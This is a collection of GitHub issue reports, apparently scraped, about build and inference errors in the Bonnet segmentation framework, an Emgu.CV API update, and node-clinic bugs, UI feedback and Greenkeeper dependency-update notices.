117097478
Hallo,

I tried to build the package in ROS Kinetic on Jetson TX2 (Jetpack 3.3) and received following error:
![image](https://user-images.githubusercontent.com/46493213/50840989-0438cf00-1364-11e9-8fb2-8d8efbbec5f6.png)

Do anyone know why I receive this message?

Thanks
 After running the cnn_freeze script and getting access to the froze_model forder in the tmp folder, I want to run the cnn_use_pb_tensorRT.py script but I got this error message: what is going wrong here?

> [TensorRT] ERROR: UFFParser: Validator error: test_model/model/decoder/upsample/unpool3/inv-res-3/inverted_residual/conv/out/LeakyRelu: Unsupported operation _LeakyRelu
[TensorRT] ERROR: Failed to parse UFF model stream
  File "/usr/lib/python2.7/dist-packages/tensorrt/legacy/utils/__init__.py", line 255, in uff_to_trt_engine
    assert(parser.parse_buffer(stream, 0, network, model_datatype))
Traceback (most recent call last):
  File "/home/pedram/Desktop/bonnet-master (copy)/cnn_use_pb_tensorRT.py", line 251, in <module>
    DATA_TYPE)  # .HALF for fp16 in jetson!
  File "/usr/lib/python2.7/dist-packages/tensorrt/legacy/utils/__init__.py", line 263, in uff_to_trt_engine
    raise AssertionError('UFF parsing failed on line {} in statement {}'.format(line, text))
AssertionError: UFF parsing failed on line 255 in statement assert(parser.parse_buffer(stream, 0, network, model_datatype))

Any ideas what is going wrong here?

P.S: I am using:
Ubuntu 16.04
GPU: Nvidia 1050ti
Nvidia driver version: 384.130 
Cuda: 9.0
Cudnn: 7
Python: 2.7
Tensroflow version: 1.13.0rc
TensorRT version: 5.0.2.6 Hello,

I am attempting to use deploy_cpp with TensorRT backend.

I have installted TensorRT 4 succesfully, 

when i run catkin_make, it throws the warning that i do not have tensorflow_cc, but that tensorRT is found. I am under the impression that should be enough?

The following is what i am seeing 
/home/ubuntu/bonnet_ws/src/bonnet/deploy_cpp/src/lib/src/netTRT.cpp:113:56: error: no matching function for call to ‘nvuffparser::IUffParser::registerInput(const char*, nvinfer1::DimsCHW&)’
   _parser->registerInput(_input_node.c_str(), inputDims);

 Hi,
I found the prediction format is different from the label on Cityscapes.
Is there any script to synchronize in this repository?
Thank you.   
 Hello,
First, thank you for the awesome work!
I am trying to run the pre-trained model of the CWC in the docker.
I downloaded the pre-trained model and froze it.
So I tried the inference on an image from the [dataset](https://github.com/ros-agriculture/dataset/blob/master/images/001_image.png) (I tried different images).
And the result is not the one expected:
![001_image_mask](https://user-images.githubusercontent.com/8058486/66065459-b7c39e00-e547-11e9-934d-0d7ffb021d7c.png)

It seems that most of the background is detected as weed and that no crops are detected. I was expecting something close to the mask from the dataset.
I tried with tf and trt as backend and both return the same output.
From the readme we can see that the output should be way better. Any idea why I am getting this output?
Thanks,

Guillaume
 After running the cnn_freeze script and getting access to the /tmp/frozen_model forder , I want to run the cnn_use_pb_tensorRT.py script but I got this error message: what is going wrong here?

> [TensorRT] ERROR: UFFParser: Validator error: test_model/model/decoder/upsample/unpool3/inv-res-3/inverted_residual/conv/out/LeakyRelu: Unsupported operation _LeakyRelu
[TensorRT] ERROR: Failed to parse UFF model stream
  File "/usr/lib/python2.7/dist-packages/tensorrt/legacy/utils/__init__.py", line 255, in uff_to_trt_engine
    assert(parser.parse_buffer(stream, 0, network, model_datatype))
Traceback (most recent call last):
  File "/home/pedram/Desktop/bonnet-master/cnn_use_pb_tensorRT.py", line 251, in <module>
    DATA_TYPE)  # .HALF for fp16 in jetson!
  File "/usr/lib/python2.7/dist-packages/tensorrt/legacy/utils/__init__.py", line 263, in uff_to_trt_engine
    raise AssertionError('UFF parsing failed on line {} in statement {}'.format(line, text))
AssertionError: UFF parsing failed on line 255 in statement assert(parser.parse_buffer(stream, 0, network, model_datatype))

Any ideas what is going wrong here?

P.S: I am using:
Ubuntu 16.04
GPU: Nvidia 1050ti
Nvidia driver version: 384.130 
Cuda: 9.0
Cudnn: 7
Python: 2.7
Tensroflow version: 1.13.0rc
TensorRT version: 5.0.2.6 In the README file, it says that the framework has been tested on a computer without GPU so I thought I'd give it a try. Unfortunately, the installation instructions using `nvidia-docker` only seem to work for computers with GPU. I've tried to install and run using vanilla docker which seemed to work but when try to run `./cnn_use.py -l /tmp/path/to/log/ -p /tmp/path/to/pretrained -i /path/to/image` for example, I get the following error:
```python
Traceback (most recent call last):
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow.py", line 58, in <module>
    from tensorflow.python.pywrap_tensorflow_internal import *
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow_internal.py", line 28, in <module>
    _pywrap_tensorflow_internal = swig_import_helper()
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow_internal.py", line 24, in swig_import_helper
    _mod = imp.load_module('_pywrap_tensorflow_internal', fp, pathname, description)
  File "/usr/lib/python3.5/imp.py", line 242, in load_module
    return load_dynamic(name, filename, file)
  File "/usr/lib/python3.5/imp.py", line 342, in load_dynamic
    return _load(spec)
ImportError: libcuda.so.1: cannot open shared object file: No such file or directory
```

Could anybody help me out with the installation for a computer without GPU? I am using a MacBook Pro with Ubuntu 18.04. Hi,

I would like to use Bonnet on a Jetson TX2 to do inference.
I try to install it with docker (by using indicated procedure) but it doesn't work.
Someone has already succeed in this task?

Thank you, Hi,
I'm doing my Master thesis with your Bonnet. I just want to ask what is the difference between your "inception-like model" and "original-inception model". What did you do to speed up the semantic segmentation? Thank you a lot

Best regards
Thanh Do you have any plans on implementing BiSeNet as an available architecture? https://arxiv.org/abs/1808.00897 I am running the ROS node on my PC. I downloaded the persons_512 model and froze it using python3 cnn_freeze.py -p ../../../../Downloads/persons_512 -l  ../../../../Downloads/persons_512_frozen/

Later I changed the config file to the new model path model_path: "/home/padmaja/Downloads/persons_512_frozen"

However, I get the following error:
Full model path: /home/padmaja/Downloads/persons_512_frozen//optimized_tRT.uff
Can't open one of the node names from the nodes.yaml fileyaml-cpp: error at line 0, column 0: bad conversion
Closing engine and exiting.
Unable to init. network. 
Failed to initialize CNN
[ERROR] [1560242291.484392845]: SOMETHING WENT WRONG INITIALIZING CNN. EXITING
 I am running the ROS node on my PC. I downloaded the persons_512 model and froze it using python3 cnn_freeze.py -p ../../../../Downloads/persons_512 -l  ../../../../Downloads/persons_512_frozen/

Later I changed the config file to the new model path model_path: "/home/padmaja/Downloads/persons_512_frozen"

However, I get the following error:
Full model path: /home/padmaja/Downloads/persons_512_frozen//optimized_tRT.uff
Can't open one of the node names from the nodes.yaml fileyaml-cpp: error at line 0, column 0: bad conversion
Closing engine and exiting.
Unable to init. network. 
Failed to initialize CNN
[ERROR] [1560242291.484392845]: SOMETHING WENT WRONG INITIALIZING CNN. EXITING


Thanks in advance! Hey Andres,

In the NetTRT.cpp code, the line:

`_builder->setMaxWorkspaceSize(1 << size);`

I assume this means the amount of GPU mem allocated for the network? You use size 32. What does this mean in this context?

If i wanted to deploy two models (two .uff files), on one GPU, how do you recommend i proceed?
 Dear Andres,
can you provide a brief description of the steps for retraining the bonnet network for CityScapes from Scratch.

Thanks.
Chino This error occurs on some dataset not all of them:
I don't know why

`Weights for loss function (median frec/frec(c)):
 [0.07206047 0.98466394 1.3721456 ]
Traceback (most recent call last):
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/framework/ops.py", line 1628, in _create_c_op
    c_op = c_api.TF_FinishOperation(op_desc)
tensorflow.python.framework.errors_impl.InvalidArgumentError: Dimensions must be equal, but are 1867776 and 1800000 for 'train_model/model/loss_0/loss/Pow' (op: 'Pow') with input shapes: [1867776,3], [1800000,3].

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "./cnn_train.py", line 186, in <module>
    net.train()
  File "/home/ubuntu/bonnet_run/bonnet/train_py/arch/abstract_net.py", line 1076, in train
    self.TRAIN["loss"], self.TRAIN["w_decay"])
  File "/home/ubuntu/bonnet_run/bonnet/train_py/arch/abstract_net.py", line 145, in loss_f
    focal_softmax = tf.pow(1 - softmax_mat, gamma_tf) * \
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/ops/math_ops.py", line 444, in pow
    return gen_math_ops._pow(x, y, name=name)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/ops/gen_math_ops.py", line 5293, in _pow
    "Pow", x=x, y=y, name=name)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/framework/op_def_library.py", line 787, in _apply_op_helper
    op_def=op_def)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/util/deprecation.py", line 488, in new_func
    return func(*args, **kwargs)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/framework/ops.py", line 3274, in create_op
    op_def=op_def)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/framework/ops.py", line 1792, in __init__
    control_input_ops)
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/framework/ops.py", line 1631, in _create_c_op
    raise ValueError(str(e))
ValueError: Dimensions must be equal, but are 1867776 and 1800000 for 'train_model/model/loss_0/loss/Pow' (op: 'Pow') with input shapes: [1867776,3], [1800000,3].` Hey Andres,

In the NetTRT.cpp code, the line:

`_builder->setMaxWorkspaceSize(1 << size);`

I assume this means the amount of GPU mem allocated for the network? You use size 32. What does this mean in this context?

If i wanted to deploy two models (two .uff files), on one GPU, how do you recommend i proceed?
 Hi,

I would like to use Bonnet on a Jetson TX2 to do inference.
I try to install it with docker (by using indicated procedure) but it doesn't work.
Someone has already succeed in this task?

Thank you, Hello,

I am attempting to use deploy_cpp with TensorRT backend.

I have installted TensorRT 4 succesfully, 

when i run catkin_make, it throws the warning that i do not have tensorflow_cc, but that tensorRT is found. I am under the impression that should be enough?

The following is what i am seeing 
/home/ubuntu/bonnet_ws/src/bonnet/deploy_cpp/src/lib/src/netTRT.cpp:113:56: error: no matching function for call to ‘nvuffparser::IUffParser::registerInput(const char*, nvinfer1::DimsCHW&)’
   _parser->registerInput(_input_node.c_str(), inputDims);

 In the README file, it says that the framework has been tested on a computer without GPU so I thought I'd give it a try. Unfortunately, the installation instructions using `nvidia-docker` only seem to work for computers with GPU. I've tried to install and run using vanilla docker which seemed to work but when try to run `./cnn_use.py -l /tmp/path/to/log/ -p /tmp/path/to/pretrained -i /path/to/image` for example, I get the following error:
```python
Traceback (most recent call last):
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow.py", line 58, in <module>
    from tensorflow.python.pywrap_tensorflow_internal import *
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow_internal.py", line 28, in <module>
    _pywrap_tensorflow_internal = swig_import_helper()
  File "/usr/local/lib/python3.5/dist-packages/tensorflow/python/pywrap_tensorflow_internal.py", line 24, in swig_import_helper
    _mod = imp.load_module('_pywrap_tensorflow_internal', fp, pathname, description)
  File "/usr/lib/python3.5/imp.py", line 242, in load_module
    return load_dynamic(name, filename, file)
  File "/usr/lib/python3.5/imp.py", line 342, in load_dynamic
    return _load(spec)
ImportError: libcuda.so.1: cannot open shared object file: No such file or directory
```

Could anybody help me out with the installation for a computer without GPU? I am using a MacBook Pro with Ubuntu 18.04. Hello,

I am curious what the difference between the input_node and the input_norm_and_resized_node are?

I see in deploy_cpp that netTF.cpp utilizes input_node, and netTRT.cpp utilizes input_norm_and_resized_node.


<---------->
117766744
These three lines:
```
            Emgu.CV.Dnn.Importer caffe = Emgu.CV.Dnn.Importer.CreateCaffeImporter("Text.prototxt", "Model.caffemodel");
            Emgu.CV.Dnn.Net net = new Emgu.CV.Dnn.Net();
            caffe.PopulateNet(net);
```
Can (should) be replaced with this one line in later versions of Emgu.CV (3.4.3)
```
            Emgu.CV.Dnn.Net net = Emgu.CV.Dnn.DnnInvoke.ReadNetFromCaffe("Text.prototxt", "Model.caffemodel");
 These three lines:
```
            Emgu.CV.Dnn.Importer caffe = Emgu.CV.Dnn.Importer.CreateCaffeImporter("Text.prototxt", "Model.caffemodel");
            Emgu.CV.Dnn.Net net = new Emgu.CV.Dnn.Net();
            caffe.PopulateNet(net);
```
Can (should) be replaced with this one line in later versions of Emgu.CV (3.4.3)
```
            Emgu.CV.Dnn.Net net = Emgu.CV.Dnn.DnnInvoke.ReadNetFromCaffe("Text.prototxt", "Model.caffemodel");

<---------->
117836010
## Expected Behavior
Process closed and report generated on ctrl+c\

## Current Behavior
app is stuck on closing. 
/ Received Ctrl+C, closing process...
and thats it - it just there for hours
Happens on both bubbleproof and doctor

## Steps to Reproduce (for bugs)
https://www.dropbox.com/s/vt3kyj7jgef8qr8/vxcv.zip?dl=0
yarn install, yarn build, yarn nc

## Sample upload
<!--- Please `clinic upload` your generated sample and paste the link here -->

## Environment
<!--- Check with `clinic -v` and `clinic doctor -v` -->
<!--- e.g. Clinic.js v0.8.1 Doctor v2.4.1 -->
* Clinic.js version: v4.1.0

<!--- Check with `node -v` and `npm -v` -->
<!--- e.g. Node v10.2.1 npm v6.0.1 -->
* Node.js version: 12.10

<!--- See https://whatbrowser.org/ -->
<!--- e.g. Chrome 67 -->
* Browser name and version:

<!--- See http://whatsmyos.com/ -->
<!--- e.g. OSX 10.11.5 -->
* Operating system and version:
win 10 
## The dependency [rimraf](https://github.com/isaacs/rimraf) was updated from `2.6.2` to `2.6.3`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Frimraf-2.6.3).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




rimraf is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=361) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 6 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/9442819908e52f2c32620e8fa609d7a5d472cc2c"><code>9442819</code></a> <code>2.6.3</code></li>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/42fe369c3fce6e19e96e29dfc99655ca900d34af"><code>42fe369</code></a> <code>autopublish scripts</code></li>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/21fd3dfb9ad461b6092cca1e75bf34fa401077fb"><code>21fd3df</code></a> <code>bin test</code></li>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/8f1d3a1ecc4cda0f6433b0a8075a4b16deba1e23"><code>8f1d3a1</code></a> <code>update tap and glob for security stuff</code></li>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/f0bc3a112579740a3d4c6e078d53feede97c9841"><code>f0bc3a1</code></a> <code>update tap, add package-lock</code></li>
<li><a href="https://urls.greenkeeper.io/isaacs/rimraf/commit/692022bf0865242f216c8e339e5bf442426bc5e0"><code>692022b</code></a> <code>travis node version updates</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/isaacs/rimraf/compare/79b933fb362b2c51bedfa448be848e1d7ed32d7e...9442819908e52f2c32620e8fa609d7a5d472cc2c">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 Hi, I have an app with support of worker_threads and as I can see node clinic can't work with that( 
As soon as I start it I receive
 
```
/usr/local/lib/node_modules/clinic/bin.js:536
      if (err) throw err
               ^

Error: process exited by signal SIGSEGV
    at ChildProcess.<anonymous> (/usr/local/lib/node_modules/clinic/node_modules/@nearform/doctor/index.js:114:13)
    at Object.onceWrapper (events.js:297:20)
    at ChildProcess.emit (events.js:209:13)
    at Process.ChildProcess._handle.onexit (internal/child_process.js:272:12)
```

Is there any way to get around this? Putting env variables here and there is a little bit problematic in our codebase so would be nice to have some other options to do that

Thanks in advance!

## Environment
* Clinic.js version: v4.1.0 
* Doctor version: v4.0.6

* Node.js version: v12.9.0

* Operating system and version: OS X 10.14.4
 ### Issue description

I am going through the tutorial and find it really hard to comprehend the UI. 
No doubt it makes sense for those who are used to it or perhaps have used similar tools in the past (although even then, I am not sure this works as well as it could).

For example, this is quite a mess, UX-wise:

![image](https://user-images.githubusercontent.com/7287076/55339816-52f59100-549b-11e9-845a-a164e52e0551.png)

It's impossible to read anything clearly, the boundaries of erach block are barely visible and seemingly overlapping and simply very chaotic.

There is no clear separation between the list of files and the graph section; they just sort-of flow into each other.

The font color is too dark so not the easiest to read. And there are separate pieces of information stuffed together into the same box, separated by ellipses, and again it's not clear what is what and how the different bits and bobs are related to each other.

I kept trying to highlight a section in the graph by clicking and dragging across it (you know, like a "brush" in a lot of chart libraries, but it does nothing.

The interactivity of the different bars in the graph is not at all obvious, because the on-hover dropdown is very subtle and again the colors are not well separated and the box is overflowing partially, but not clearly, so hard to differentiate at first sight:
![image](https://user-images.githubusercontent.com/7287076/55340248-33ab3380-549c-11e9-8278-1042ecff7dc2.png)

Also, the fact that you have to click on the chart in order to get back to the default view (after expanding) is very unexpected behaviour and confused me at first (I read it in the tutorial, but if one has to read the docs to grasp an interaction, that's already bad UX).

Now, I'm not a designer at all, and I don't want to poo poo the product, which is extremely helpful (kudos :+1:).
I just wanted to log a bit of frustration with the UI, as I start to familiarize myself with it.
Cheers.
 
## The dependency [inquirer]() was updated from `6.4.1` to `6.5.0`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Finquirer-6.5.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




inquirer is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ❌ **nearform.node-clinic (Mac node_10_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 7 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/da5d0e22de84486240b12f52643fbd573f8d0d38"><code>da5d0e2</code></a> <code>Publish</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/e05ae81019a6b524917b2453c107aa93d661b705"><code>e05ae81</code></a> <code>Issue 711 update (#825)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/dbfe8904190f33cae41fecc4cb775d4dfcc5615e"><code>dbfe890</code></a> <code>Clear password field on backspace (#821)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/e14796b41980264dd17f03c50063db542dcd3f2b"><code>e14796b</code></a> <code>Upgrade lodash to 4.17.12 to Fix Vulnerability (#824)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/29ac9657f747e83198639b3052d0d513831b37e8"><code>29ac965</code></a> <code>Update husky to the latest version 🚀 (#819)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/d82131ef824fc7c6052ed0333fc932dce2d0932c"><code>d82131e</code></a> <code>Update lint-staged to the latest version 🚀 (#818)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/1f849abcf88690931e23ada062e0d19e9b83545b"><code>1f849ab</code></a> <code>feat: add inquirer-file-tree-selection-prompt readme (#815)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/compare/b951b48e46930b3fe6300b7f42f58d3042579619...da5d0e22de84486240b12f52643fbd573f8d0d38">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 ## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->

## Current Behavior
<!--- If describing a bug, tell us what happens instead of the expected behavior -->
<!--- If suggesting a change/improvement, explain the difference from current behavior -->

## Steps to Reproduce (for bugs)
<!--- Provide an unambiguous set of steps to reproduce this bug -->
1.
2.
3.
4.

## Sample upload
<!--- Please `clinic upload` your generated sample and paste the link here -->

## Environment
<!--- Check with `clinic -v` and `clinic doctor -v` -->
<!--- e.g. Clinic.js v0.8.1 Doctor v2.4.1 -->
* Clinic.js version:

<!--- Check with `node -v` and `npm -v` -->
<!--- e.g. Node v10.2.1 npm v6.0.1 -->
* Node.js version:

<!--- See https://whatbrowser.org/ -->
<!--- e.g. Chrome 67 -->
* Browser name and version:

<!--- See http://whatsmyos.com/ -->
<!--- e.g. OSX 10.11.5 -->
* Operating system and version:
 
## The dependency [autocannon](https://github.com/mcollina/autocannon) was updated from `4.1.1` to `4.2.0`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Fautocannon-4.2.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




autocannon is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Windows node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ❌ **nearform.node-clinic (Windows node_13_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Mac node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Mac node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Linux node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Mac node_13_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
- ✅ **nearform.node-clinic (Linux node_13_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1890) 
</details>


---

<details>
<summary>Release Notes for v4.2.0</summary>

<h2>What’s Changed</h2>
<ul>
<li>chore(package): update tap to version 14.6.7 (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="500161937" data-permission-text="Issue title is private" data-url="https://github.com/mcollina/autocannon/issues/219" data-hovercard-type="pull_request" data-hovercard-url="/mcollina/autocannon/pull/219/hovercard" href="https://urls.greenkeeper.io/mcollina/autocannon/pull/219">#219</a>) <a class="user-mention" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=52195" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://urls.greenkeeper.io/mcollina">@mcollina</a></li>
<li>Propagate counter on tick (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="513771769" data-permission-text="Issue title is private" data-url="https://github.com/mcollina/autocannon/issues/224" data-hovercard-type="pull_request" data-hovercard-url="/mcollina/autocannon/pull/224/hovercard" href="https://urls.greenkeeper.io/mcollina/autocannon/pull/224">#224</a>) <a class="user-mention" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=52822073" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://urls.greenkeeper.io/catalin-me">@catalin-me</a></li>
<li>Update bl to the latest version <g-emoji class="g-emoji" alias="rocket" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png">🚀</g-emoji> (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="495535441" data-permission-text="Issue title is private" data-url="https://github.com/mcollina/autocannon/issues/218" data-hovercard-type="pull_request" data-hovercard-url="/mcollina/autocannon/pull/218/hovercard" href="https://urls.greenkeeper.io/mcollina/autocannon/pull/218">#218</a>) <a class="user-mention" data-hovercard-type="organization" data-hovercard-url="/orgs/Greenkeeper/hovercard" href="https://urls.greenkeeper.io/Greenkeeper">@Greenkeeper</a></li>
</ul>
</details>

<details>
<summary>Commits</summary>
<p>The new version differs by 4 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/mcollina/autocannon/commit/6b2e017ac7b8c7e54abe7b8b4fb59bcf74fd013e"><code>6b2e017</code></a> <code>add option to print errors (#217)</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/autocannon/commit/5a434085e0d5e1b7b7de176726ea4d81920845ad"><code>5a43408</code></a> <code>chore(package): update tap to version 14.6.7 (#219)</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/autocannon/commit/b91e0b3c37e997fb8506f5851b9537c9bcb1fec6"><code>b91e0b3</code></a> <code>Propagate counter on tick (#224)</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/autocannon/commit/7c9b675f73e4f434da3d8d3b8984c1dc89973a7d"><code>7c9b675</code></a> <code>chore(package): update bl to version 4.0.0 (#218)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/mcollina/autocannon/compare/168b52d8d6a29c38a74bcea2f0b14ee9b4d841cf...6b2e017ac7b8c7e54abe7b8b4fb59bcf74fd013e">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 ## Expected Behavior
```
clinic flame -- node script.js # run test and ctrl+c should generate a flame graph
```

## Current Behavior
